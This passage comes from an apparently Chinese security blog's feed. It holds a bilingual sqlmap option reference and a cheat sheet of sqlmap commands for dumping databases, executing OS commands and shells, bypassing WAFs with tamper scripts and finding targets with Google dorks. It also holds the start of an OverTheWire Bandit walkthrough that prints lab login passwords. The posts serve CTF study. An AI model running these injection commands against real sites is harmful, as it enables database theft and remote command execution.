参数用于保存anti-CSRF令牌</span><br><span class="line">    --csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token        提取anti-CSRF URL地址访问令牌</span><br><span class="line">    --force-ssl         Force usage of SSL/HTTPS                               强制使用SSL / HTTPS</span><br><span class="line">    --hpp               Use HTTP parameter pollution method                    使用HTTP参数pollution的方法</span><br><span class="line">    --eval=EVALCODE     Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码</span><br><span class="line">                        &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)</span><br><span class="line"> </span><br><span class="line">  Optimization（优化）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to optimize the performance of sqlmap    这些选项可用于优化sqlmap的性能</span><br><span class="line"> </span><br><span class="line">    -o                  Turn on all optimization switches                        开启所有优化开关</span><br><span class="line">    --predict-output    Predict common queries output                            预测常见的查询输出</span><br><span class="line">    --keep-alive        Use persistent HTTP(s) connections                       使用持久的HTTP（S）连接</span><br><span class="line">    --null-connection   Retrieve page length without actual HTTP response body   从没有实际的HTTP响应体中检索页面长度</span><br><span class="line">    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)    最大的HTTP（S）请求并发量（默认为1）</span><br><span class="line"> </span><br><span class="line">  Injection（注入）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to specify which parameters to test for,</span><br><span class="line">    provide custom injection payloads and optional tampering scripts </span><br><span class="line">    这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</span><br><span class="line"> </span><br><span class="line">    -p TESTPARAMETER    Testable parameter(s)                                      可测试的参数（S）</span><br><span class="line">    --skip=SKIP         Skip testing for given parameter(s)                        跳过对给定参数的测试</span><br><span class="line">    --skip-static       Skip testing parameters that not appear to be dynamic      跳过测试不显示为动态的参数</span><br><span class="line">    --param-exclude=..  Regexp to exclude parameters from testing (e.g. &quot;ses&quot;)     使用正则表达式排除参数进行测试（e.g. &quot;ses&quot;）</span><br><span class="line">    --dbms=DBMS         Force back-end DBMS to this value                          强制后端的DBMS为此值  </span><br><span class="line">    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)            DBMS认证凭证(user:password) </span><br><span class="line">    --os=OS             Force back-end DBMS operating system to this value         强制后端的DBMS操作系统为这个值</span><br><span class="line">    --invalid-bignum    Use big numbers for invalidating values                    使用大数字使值无效</span><br><span class="line">    --invalid-logical   Use logical operations for invalidating values             使用逻辑操作使值无效</span><br><span class="line">    --invalid-string    Use random strings for invalidating values                 使用随机字符串使值无效</span><br><span class="line">    --no-cast           Turn off payload casting mechanism                         关闭有效载荷铸造机制</span><br><span class="line">    --no-escape         Turn off string escaping mechanism                         关闭字符串转义机制</span><br><span class="line">    --prefix=PREFIX     Injection payload prefix string                            注入payload字符串前缀</span><br><span class="line">    --suffix=SUFFIX     Injection payload suffix string                            注入payload字符串后缀  </span><br><span class="line">    --tamper=TAMPER     Use given script(s) for tampering injection data           使用给定的脚本（S）篡改注入数据</span><br><span class="line"> </span><br><span class="line">  Detection（检测）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to customize the detection phase 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</span><br><span class="line"> </span><br><span class="line">    --level=LEVEL       Level of tests to perform (1-5, default 1)          执行测试的等级（1-5，默认为1）</span><br><span class="line">    --risk=RISK         Risk of tests to perform (1-3, default 1)           执行测试的风险（0-3，默认为1）</span><br><span class="line">    --string=STRING     String to match when query is evaluated to True     查询时有效时在页面匹配字符串 </span><br><span class="line">    --not-string=NOT..  String to match when query is evaluated to False    当查询求值为无效时匹配的字符串</span><br><span class="line">    --regexp=REGEXP     Regexp to match when query is evaluated to True     查询时有效时在页面匹配正则表达式</span><br><span class="line">    --code=CODE         HTTP code to match when query is evaluated to True  当查询求值为True时匹配的HTTP代码</span><br><span class="line">    --text-only         Compare pages based only on the textual content     仅基于在文本内容比较网页</span><br><span class="line">    --titles            Compare pages based only on their titles            仅根据他们的标题进行比较</span><br><span class="line"> </span><br><span class="line">  Techniques（技巧）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to tweak testing of specific SQL injection</span><br><span class="line">    techniques </span><br><span class="line">    这些选项可用于调整具体的SQL注入测试。 </span><br><span class="line"> </span><br><span class="line">    --technique=TECH    SQL injection techniques to use (default &quot;BEUSTQ&quot;)      SQL注入技术测试（默认BEUST）</span><br><span class="line">    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)          DBMS响应的延迟时间（默认为5秒）</span><br><span class="line">    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection  定列范围用于测试UNION查询注入</span><br><span class="line">    --union-char=UCHAR  Character to use for bruteforcing number of columns     用于暴力猜解列数的字符</span><br><span class="line">    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection  要在UNION查询SQL注入的FROM部分使用的表</span><br><span class="line">    --dns-domain=DNS..  Domain name used for DNS exfiltration attack            域名用于DNS漏出攻击</span><br><span class="line">    --second-order=S..  Resulting page URL searched for second-order response   生成页面的URL搜索为second-order响应</span><br><span class="line"> </span><br><span class="line">  Fingerprint（指纹）:</span><br><span class="line"> </span><br><span class="line">    -f, --fingerprint   Perform an extensive DBMS version fingerprint           执行检查广泛的DBMS版本指纹</span><br><span class="line"> </span><br><span class="line">  Enumeration（枚举）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to enumerate the back-end database</span><br><span class="line">    management system information, structure and data contained in the</span><br><span class="line">    tables. Moreover you can run your own SQL statements                  </span><br><span class="line">    这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。  </span><br><span class="line"> </span><br><span class="line">    -a, --all           Retrieve everything                             检索一切</span><br><span class="line">    -b, --banner        Retrieve DBMS banner                            检索数据库管理系统的标识  </span><br><span class="line">    --current-user      Retrieve DBMS current user                      检索数据库管理系统的标识  </span><br><span class="line">    --current-db        Retrieve DBMS current database                  检索数据库管理系统当前数据库  </span><br><span class="line">    --hostname          Retrieve DBMS server hostname                   检索数据库服务器的主机名</span><br><span class="line">    --is-dba            Detect if the DBMS current user is DBA          检测DBMS当前用户是否DBA  </span><br><span class="line">    --users             Enumerate DBMS users                            枚举数据库管理系统用户</span><br><span class="line">    --passwords         Enumerate DBMS users password hashes            枚举数据库管理系统用户密码哈希</span><br><span class="line">    --privileges        Enumerate DBMS users privileges                 枚举数据库管理系统用户的权限  </span><br><span class="line">    --roles             Enumerate DBMS users roles                      枚举数据库管理系统用户的角色  </span><br><span class="line">    --dbs               Enumerate DBMS databases                        枚举数据库管理系统数据库</span><br><span class="line">    --tables            Enumerate DBMS database tables                  枚举的DBMS数据库中的表  </span><br><span class="line">    --columns           Enumerate DBMS database table columns           枚举DBMS数据库表列</span><br><span class="line">    --schema            Enumerate DBMS schema                           枚举数据库架构</span><br><span class="line">    --count             Retrieve number of entries for table(s)         检索表的条目数</span><br><span class="line">    --dump              Dump DBMS database table entries                转储数据库管理系统的数据库中的表项</span><br><span class="line">    --dump-all          Dump all DBMS databases tables entries               转储数据库管理系统的数据库中的表项</span><br><span class="line">    --search            Search column(s), table(s) and/or database name(s)   搜索列（S），表（S）和/或数据库名称（S）</span><br><span class="line">    --comments          Retrieve DBMS comments                               检索数据库的comments(注释、评论)</span><br><span class="line">    -D DB               DBMS database to enumerate                           要进行枚举的数据库名 </span><br><span class="line">    -T TBL              DBMS database table(s) to enumerate                  要进行枚举的数据库表</span><br><span class="line">    -C COL              DBMS database table column(s) to enumerate           要进行枚举的数据库列 </span><br><span class="line">    -X EXCLUDECOL       DBMS database table column(s) to not enumerate       要不进行枚举的数据库列 </span><br><span class="line">    -U USER             DBMS user to enumerate                               用来进行枚举的数据库用户 </span><br><span class="line">    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables   枚举表时排除系统数据库 </span><br><span class="line">    --pivot-column=P..  Pivot column name                                       主列名称</span><br><span class="line">    --where=DUMPWHERE   Use WHERE condition while table dumping                 使用WHERE条件进行表转储</span><br><span class="line">    --start=LIMITSTART  First query output entry to retrieve                    第一个查询输出进入检索</span><br><span class="line">    --stop=LIMITSTOP    Last query output entry to retrieve                     最后查询的输出进入检索</span><br><span class="line">    --first=FIRSTCHAR   First query output word character to retrieve           第一个查询输出字的字符检索 </span><br><span class="line">    --last=LASTCHAR     Last query output word character to retrieve            最后查询的输出字字符检索 </span><br><span class="line">    --sql-query=QUERY   SQL statement to be executed                            要执行的SQL语句</span><br><span class="line">    --sql-shell         Prompt for an interactive SQL shell                     提示交互式SQL的shell</span><br><span class="line">    --sql-file=SQLFILE  Execute SQL statements from given file(s)               从给定文件执行SQL语句</span><br><span class="line"> </span><br><span class="line">  Brute force（蛮力）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to run brute force checks         这些选项可以被用来运行蛮力检查。</span><br><span class="line"> </span><br><span class="line">    --common-tables     Check existence of common tables        检查存在共同表 </span><br><span class="line">    --common-columns    Check existence of common columns       检查存在共同列</span><br><span class="line"> </span><br><span class="line">  User-defined function injection（用户自定义函数注入）:</span><br><span class="line">    These options can be used to create custom user-defined functions   这些选项可以用来创建用户自定义函数。</span><br><span class="line"> </span><br><span class="line">    --udf-inject        Inject custom user-defined functions        注入用户自定义函数  </span><br><span class="line">    --shared-lib=SHLIB  Local path of the shared library            共享库的本地路径 </span><br><span class="line"> </span><br><span class="line">  File system access（访问文件系统）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to access the back-end database management      </span><br><span class="line">    system underlying file system</span><br><span class="line">    这些选项可以被用来访问后端数据库管理系统的底层文件系统。</span><br><span class="line"> </span><br><span class="line">    --file-read=RFILE   Read a file from the back-end DBMS file system        从后端的数据库管理系统文件系统读取文件  </span><br><span class="line">    --file-write=WFILE  Write a local file on the back-end DBMS file system   编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line">    --file-dest=DFILE   Back-end DBMS absolute filepath to write to           后端的数据库管理系统写入文件的绝对路径</span><br><span class="line"> </span><br><span class="line">  Operating system access（操作系统访问）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to access the back-end database management</span><br><span class="line">    system underlying operating system  </span><br><span class="line">    这些选项可以用于访问后端数据库管理系统的底层操作系统。</span><br><span class="line"> </span><br><span class="line">    --os-cmd=OSCMD      Execute an operating system command                     执行操作系统命令 </span><br><span class="line">    --os-shell          Prompt for an interactive operating system shell        交互式的操作系统的shell</span><br><span class="line">    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC             获取一个OOB shell，meterpreter或VNC </span><br><span class="line">    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC   一键获取一个OOB shell，meterpreter或VNC </span><br><span class="line">    --os-bof            Stored procedure buffer overflow exploitation           存储过程缓冲区溢出利用</span><br><span class="line">    --priv-esc          Database process user privilege escalation              数据库进程用户权限提升</span><br><span class="line">    --msf-path=MSFPATH  Local path where Metasploit Framework is installed      Metasploit Framework本地的安装路径</span><br><span class="line">    --tmp-path=TMPPATH  Remote absolute path of temporary files directory       远程临时文件目录的绝对路径</span><br><span class="line"> </span><br><span class="line">  Windows registry access（Windows注册表访问）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to access the back-end database management</span><br><span class="line">    system Windows registry     </span><br><span class="line">    这些选项可以被用来访问后端数据库管理系统Windows注册表。</span><br><span class="line"> </span><br><span class="line">    --reg-read          Read a Windows registry key value           读一个Windows注册表项值</span><br><span class="line">    --reg-add           Write a Windows registry key value data     写一个Windows注册表项值数据</span><br><span class="line">    --reg-del           Delete a Windows registry key value         删除Windows注册表键值</span><br><span class="line">    --reg-key=REGKEY    Windows registry key                        Windows注册表键 </span><br><span class="line">    --reg-value=REGVAL  Windows registry key value                  Windows注册表项值 </span><br><span class="line">    --reg-data=REGDATA  Windows registry key value data             Windows注册表键值数据  </span><br><span class="line">    --reg-type=REGTYPE  Windows registry key value type             Windows注册表项值类型</span><br><span class="line"> </span><br><span class="line">  General（一般）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to set some general working parameters    这些选项可以用来设置一些一般的工作参数。 </span><br><span class="line"> </span><br><span class="line">    -s SESSIONFILE      Load session from a stored (.sqlite) file                   保存和恢复检索会话文件的所有数据</span><br><span class="line">    -t TRAFFICFILE      Log all HTTP traffic into a textual file                    记录所有HTTP流量到一个文本文件中</span><br><span class="line">    --batch             Never ask for user input, use the default behaviour         从不询问用户输入，使用所有默认配置。 </span><br><span class="line">    --binary-fields=..  Result fields having binary values (e.g. &quot;digest&quot;)          具有二进制值的结果字段</span><br><span class="line">    --charset=CHARSET   Force character encoding used for data retrieval            强制用于数据检索的字符编码</span><br><span class="line">    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL              从目标网址开始抓取网站</span><br><span class="line">    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. &quot;logout&quot;)       正则表达式排除网页抓取</span><br><span class="line">    --csv-del=CSVDEL    Delimiting character used in CSV output (default &quot;,&quot;)       分隔CSV输出中使用的字符</span><br><span class="line">    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)       转储数据的格式</span><br><span class="line">    --eta               Display for each output the estimated time of arrival       显示每个输出的预计到达时间</span><br><span class="line">    --flush-session     Flush session files for current target                      刷新当前目标的会话文件</span><br><span class="line">    --forms             Parse and test forms on target URL                          在目标网址上解析和测试表单</span><br><span class="line">    --fresh-queries     Ignore query results stored in session file                 忽略在会话文件中存储的查询结果</span><br><span class="line">    --hex               Use DBMS hex function(s) for data retrieval                 使用DBMS hex函数进行数据检索</span><br><span class="line">    --output-dir=OUT..  Custom output directory path                                自定义输出目录路径</span><br><span class="line">    --parse-errors      Parse and display DBMS error messages from responses        解析和显示响应中的DBMS错误消息</span><br><span class="line">    --save=SAVECONFIG   Save options to a configuration INI file                    保存选项到INI配置文件</span><br><span class="line">    --scope=SCOPE       Regexp to filter targets from provided proxy log            使用正则表达式从提供的代理日志中过滤目标</span><br><span class="line">    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)           根据有效负载和/或标题(e.g. ROW)选择测试</span><br><span class="line">    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)       根据有效负载和/或标题跳过测试（e.g. BENCHMARK）</span><br><span class="line">    --update            Update sqlmap                                                更新SqlMap</span><br><span class="line"> </span><br><span class="line">  Miscellaneous（杂项）:</span><br><span class="line"> </span><br><span class="line">    -z MNEMONICS        Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;)         使用简短的助记符</span><br><span class="line">    --alert=ALERT       Run host OS command(s) when SQL injection is found      在找到SQL注入时运行主机操作系统命令</span><br><span class="line">    --answers=ANSWERS   Set question answers (e.g. &quot;quit=N,follow=N&quot;)           设置问题答案</span><br><span class="line">    --beep              Beep on question and/or when SQL injection is found     发现SQL注入时提醒</span><br><span class="line">    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables   SqlMap具体的UDF和表清理DBMS </span><br><span class="line">    --dependencies      Check for missing (non-core) sqlmap dependencies        检查是否缺少（非内核）sqlmap依赖关系</span><br><span class="line">    --disable-coloring  Disable console output coloring                         禁用控制台输出颜色</span><br><span class="line">    --gpage=GOOGLEPAGE  Use Google dork results from specified page number      使用Google dork结果指定页码</span><br><span class="line">    --identify-waf      Make a thorough testing for a WAF/IPS/IDS protection    对WAF / IPS / IDS保护进行全面测试</span><br><span class="line">    --skip-waf          Skip heuristic detection of WAF/IPS/IDS protection      跳过启发式检测WAF / IPS / IDS保护</span><br><span class="line">    --mobile            Imitate smartphone through HTTP User-Agent header       通过HTTP User-Agent标头模仿智能手机</span><br><span class="line">    --offline           Work in offline mode (only use session data)            在离线模式下工作（仅使用会话数据）</span><br><span class="line">    --page-rank         Display page rank (PR) for Google dork results          Google dork结果显示网页排名（PR）</span><br><span class="line">    --purge-output      Safely remove all content from output directory         安全地从输出目录中删除所有内容</span><br><span class="line">    --smart             Conduct thorough tests only if positive heuristic(s)    只有在正启发式时才进行彻底测试</span><br><span class="line">    --sqlmap-shell      Prompt for an interactive sqlmap shell                  提示交互式sqlmap shell</span><br><span class="line">    --wizard            Simple wizard interface for beginner users              给初级用户的简单向导界面</span><br></pre></td></tr></table></figure><br>还有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">SQLMAP实战操作：</span><br><span class="line"></span><br><span class="line">1.ACCESS数据库：</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” /*-u为常规扫描参数*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –tables /*–tables拆数据库表*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –columns -T “要拆的表名”/*列出指定表名*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –dump -T “要拆的表名”-C “要拆的字段名” /*–dump为拆解字段名会保存在sqlmap/output目录下*/</span><br><span class="line"></span><br><span class="line">2.MYSQL数据库：</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” /*扫描注入点*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –dbs /*列出所有数据库*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –current-db /*列出当前数据库*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –current-user /*列出当前用户*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –tables -D “当前数据库名” /*拆解当前数据库表*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –columns -T “要拆得的表名” -D “当前数据库名” /*拆解指定表字段名*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –dump -C “字段名” -T “表名” -D “当前数据库”</span><br><span class="line"></span><br><span class="line">3.SQLSERVER数据库：</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” /*扫描注入点*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –dbs /*列出所有数据库*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –current-db /*列出当前数据库*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –current-user /*列出当前用户*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –tables -D “当前数据库名” /*拆解当前数据库表*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –columns -T “要拆得的表名” -D “当前数据库名” /*拆解指定表字段名*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –dump -C “字段名” -T “表名” -D “当前数据库”</span><br><span class="line"></span><br><span class="line">SQLSERVER操作和MYSQL是一样的！！！常见的几种数据库！！！</span><br><span class="line"></span><br><span class="line">4.COOKIE注入：</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “www.xxx.com/asp或者www.xxx.com/php”?–cookie “参数名如id=1” –level 2/*level为提升权限*/</span><br><span class="line"></span><br><span class="line">什么数据库就按照上面的数据库加上cookie语句拆解就行了</span><br><span class="line"></span><br><span class="line">5.POST注入：</span><br><span class="line"></span><br><span class="line">抓包保存到SQLMAP目录下.txt的文件然后输入指令sqlmap.py -r xxx.txt /*xxx.txt为保存包文件的文件名”</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –data “POST参数”</span><br><span class="line"></span><br><span class="line">6.执行shell命令：</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –os-cmd=”net user” /*执行net user命令*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –os-shell /*系统交互的shell*/</span><br><span class="line"></span><br><span class="line">7.注入HTTP请求 :</span><br><span class="line"></span><br><span class="line">sqlmap.py -r xxx.txt –dbs /*xxx.txt内容为HTTP请求*/</span><br><span class="line"></span><br><span class="line">8.绕过WAF的tamper插件使用：</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –tamper “xxx.py”</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –tamper=”xxx.py”</span><br><span class="line"></span><br><span class="line">关于tamper脚本详细说明在本博客中有，链接为：http://www.matsec.cn/?id=5</span><br><span class="line"></span><br><span class="line">9.将注入语句插入到指定位置：</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url(www.xxx.com/id/1*.html)”?–dbs</span><br><span class="line"></span><br><span class="line">有些网站是采用伪静态的页面使用SQLMAP的普通注入是不行的，所以SQLMAP提供了”*”参数将SQL语句插入指定位置，一般用于伪静态注入。</span><br><span class="line"></span><br><span class="line">在使用HTTP注入时使用-r参数也可以直接在文本中添加*号</span><br><span class="line"></span><br><span class="line">10.延时注入：</span><br><span class="line"></span><br><span class="line">sqlmap –dbs -u “url” –delay 0.5 /*延时0.5秒*/</span><br><span class="line"></span><br><span class="line">sqlmap –dbs -u “url” –safe-freq /*请求2次*/</span><br><span class="line"></span><br><span class="line">11.使用谷歌语法搜索注入(Google hack)：</span><br><span class="line"></span><br><span class="line">sqlmap.py -g “inurl:asp?id=1” /*””内为搜索语法，如：inurl,intitle,site,filetype</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;马上要打一场个人赛，在这里码一次sqlmap常用命令&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cla
      
    
    </summary>
    
    
      <category term="日积月累" scheme="http://bobosec.top/tags/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF/"/>
    
  </entry>
  
  <entry>
    <title>linux学习记录</title>
    <link href="http://bobosec.top/2018/10/28/bandit/"/>
    <id>http://bobosec.top/2018/10/28/bandit/</id>
    <published>2018-10-28T12:49:30.000Z</published>
    <updated>2018-11-14T07:56:24.764Z</updated>
    
    <content type="html"><![CDATA[<p>打了一场AWD还有个人赛觉得自己linux的很多命令实在太菜了，找了个网站记录一下。本Blog持续更新。。。<br>网站地址<a href="http://overthewire.org/wargames/bandit/" target="_blank" rel="noopener">bandit</a></p><h1 id="Bandit"><a href="#Bandit" class="headerlink" title="Bandit"></a>Bandit</h1><h2 id="bandit0"><a href="#bandit0" class="headerlink" title="bandit0"></a>bandit0</h2><p>The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.<br>这是先要用ssh连接<br>linux下ssh命令：<code>常用格式：ssh [-l login_name] [-p port] [user@]hostname</code><br>题目给出了用户名和密码还有地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh bandit0@bandit.labs.overthewire.org -p 2220</span><br><span class="line">密码：bandit0</span><br></pre></td></tr></table></figure><br>进去需要我们读readme文件：<code>ls</code>–&gt;<code>cat readme</code><br><code>boJ9jbbUNNfktd78OOpsqOltutMc3MY1</code><br>他每一关会告诉你后面需要用什么命令找到什么文件作为下一关的key</p><h2 id="bandit-1-2"><a href="#bandit-1-2" class="headerlink" title="bandit 1-2"></a>bandit 1-2</h2><p>The password for the next level is stored in a file called - located in the home directory<br>需要上一关readme作为key登陆bandit1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh bandit1@bandit.labs.overthewire.org -p 2220</span><br><span class="line">密码：boJ9jbbUNNfktd78OOpsqOltutMc3MY1</span><br></pre></td></tr></table></figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">需要我们找`-`文件</span><br><span class="line">ls 发现 `-`这里不能直接cat</span><br><span class="line">linux常用于读取文件内容指令主要有以下七种： </span><br><span class="line">cat,tac,nl,more,less,head,tail</span><br><span class="line">cat 文件名 –将文件内容显示在屏幕上 </span><br><span class="line">cat -n 文件名 –将文件内容显示在屏幕上，并显示行号 </span><br><span class="line">cat -b 文件名 –将文件内容显示在屏幕上，并显示行号，但是不显示空白行行号</span><br><span class="line">tac则是和cat反过来的（名字都是反过来的） </span><br><span class="line">tac 文件名 –将文件内容显示在屏幕上，但是是从最后一行开始往前显示 </span><br><span class="line">tac -s separator 文件名 –从separator往后倒序输出，倒序输出不包含separator，输出到最后一行再按照顺序将separator之前的内容输出 </span><br><span class="line">tac -b -s separator 文件名 –从separator往后倒序输出，倒序输出包含separator，输出到最后一行再按照顺序将separator之前的内容输出</span><br><span class="line">cat ./-</span><br><span class="line">CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</span><br></pre></td></tr></table></figure></p><h2 id="bandit-2-3"><a href="#bandit-2-3" class="headerlink" title="bandit 2-3"></a>bandit 2-3</h2><p>The password for the next level is stored in a file called spaces in this filename located in the home directory<br>一样的道理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh bandit2@bandit.labs.overthewire.org -p 2220</span><br><span class="line">password:CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</span><br><span class="line">bandit2@bandit:~$ ls</span><br><span class="line">spaces in this filename</span><br><span class="line">bandit2@bandit:~$ cat spaces\ in\ this\ filename </span><br><span class="line">UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</span><br></pre></td></tr></table></figure></p><h2 id="bandit-3-4"><a href="#bandit-3-4" class="headerlink" title="bandit 3-4"></a>bandit 3-4</h2><p>The password for the next level is stored in a hidden file in the inhere directory.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ssh bandit3@bandit.labs.overthewire.org -p 2220</span><br><span class="line">password:UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</span><br><span class="line">bandit3@bandit:~$ ls</span><br><span class="line">inhere</span><br><span class="line">bandit3@bandit:~$ ls -a</span><br><span class="line"> .bash_logout  .bashrc  inhere  .profile</span><br><span class="line">bandit3@bandit:~$ cat ./inhere</span><br><span class="line">cat: ./inhere: Is a directory</span><br><span class="line">bandit3@bandit:~$ cd inhere</span><br><span class="line">bandit3@bandit:~/inhere$ ls</span><br><span class="line">bandit3@bandit:~/inhere$ ls -a</span><br><span class="line"> .hidden</span><br><span class="line">bandit3@bandit:~/inhere$ cat ./.hidden</span><br><span class="line">2</span><br></pre></td></tr></table></figure><br>可以看到inhere是个文件夹所以不能直接cat，需要cd进入然后列目录，但是这个是个隐藏文件，所以要用到ls -a查看隐藏文件，最后cat文件就行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">以/开头的是绝对目录；不以/开头的是相对目录，也就是在当前目录下的作为基准。</span><br><span class="line">cd 默认是反回上一层目录。</span><br><span class="line">cd .. 也是返回当前目录的上一级目录</span><br><span class="line">cd - 返回到跳转到当前目录之前的上一个操作的目录</span><br><span class="line">cd ~ 回到主目录</span><br><span class="line">pwd 查看当前的目录</span><br><span class="line">mkdir 